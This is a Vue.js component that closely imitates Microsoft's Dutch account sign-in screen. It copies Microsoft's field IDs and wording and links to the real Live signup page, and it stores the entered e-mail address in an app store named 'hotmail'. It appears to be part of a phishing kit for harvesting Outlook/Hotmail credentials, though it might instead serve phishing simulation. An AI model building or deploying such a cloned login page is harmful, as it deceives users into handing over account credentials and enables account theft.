<template>
  <div role="main">
    <div class="">
      <div class="pagination-view animate slide-in-next">
        <div data-viewid="1" data-showfedcredbutton="true">
          <div>
            <div class="row text-title" id="loginHeader">
              <div role="heading" aria-level="1">Aanmelden</div>
            </div>
          </div>
          <div class="row">
            <div role="alert" aria-live="assertive">
              <div
                class="alert alert-error col-md-24"
                id="usernameError"
                v-if="emailError"
              >
                Voer een geldig e-mailadres in.
              </div>
            </div>
            <div class="form-group col-md-24">
              <div class="placeholderContainer">
                <input
                  type="email"
                  name="loginfmt"
                  id="i0116"
                  maxlength="113"
                  lang="en"
                  class="form-control ltr_override"
                  aria-required="true"
                  aria-label="Voer je e-mailadres in."
                  aria-describedby="loginHeader loginDescription"
                  placeholder="E-mailadres"
                  v-model="emailAddress"
                />
                <input
                  name="passwd"
                  type="password"
                  id="i0118"
                  autocomplete="off"
                  class="moveOffScreen"
                  tabindex="-1"
                  aria-hidden="true"
                />
              </div>
            </div>
          </div>
          <div class="position-buttons">
            <div class="row">
              <div class="col-md-24">
                <div class="text-13 action-links">
                  <div class="form-group">
                    Geen account?
                    <a
                      href="https://signup.live.com/signup?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1563540631&amp;rver=7.0.6737.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3dae37e84f-2c95-3176-1b02-4d5f8b1dd2ad&amp;id=292841&amp;aadredir=1&amp;CBCXT=out&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;cobrandid=90015&amp;contextid=69B3EEB47914497C&amp;bk=1563540631&amp;uiflavor=web&amp;mkt=NL-NL&amp;lc=1043&amp;uaid=8254b89138354810a9daa3fa058647f9"
                      id="signup"
                      aria-label="Een Microsoft-account maken"
                      name="createAccount"
                      >Maak er een</a
                    >
                  </div>
                  <div class="form-group">
                    <div class="form-group">
                      <a
                        id="idA_PWD_SwitchToCredPicker"
                        href="#"
                        @click="goToSigninOptions"
                        >Aanmeldingsopties</a
                      >
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="row">
              <div>
                <div class="col-xs-24 no-padding-left-right button-container">
                  <div class="inline-block">
                    <input
                      type="submit"
                      id="idSIButton9"
                      class="btn btn-block btn-primary"
                      value="Volgende"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import { mapGetters, mapActions } from "vuex";
export default {
  name: "LoginView",
  data() {
    return {
      emailError: false
    };
  },
  computed: {
    emailAddress: {
      get() {
        return this.$store.state.hotmail.emailAddress;
      },
      set(value) {
        this.$store.commit("setEmailAddress", value);
      }
    }
  },
  methods: {
    validateEmail() {
      var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
      return re.test(String(this.emailAddress).toLowerCase());
    },
    goToSigninOptions() {
      this.$emit("signInOptions");
    },
    clickNext() {
      if (this.validateEmail() === false) {
        this.emailError = true;
      } else {
        this.$emit("next");
      }
    }
  },
  watch: {
    emailAddress: function() {
      this.emailError = false;
    }
  }
};
</script>
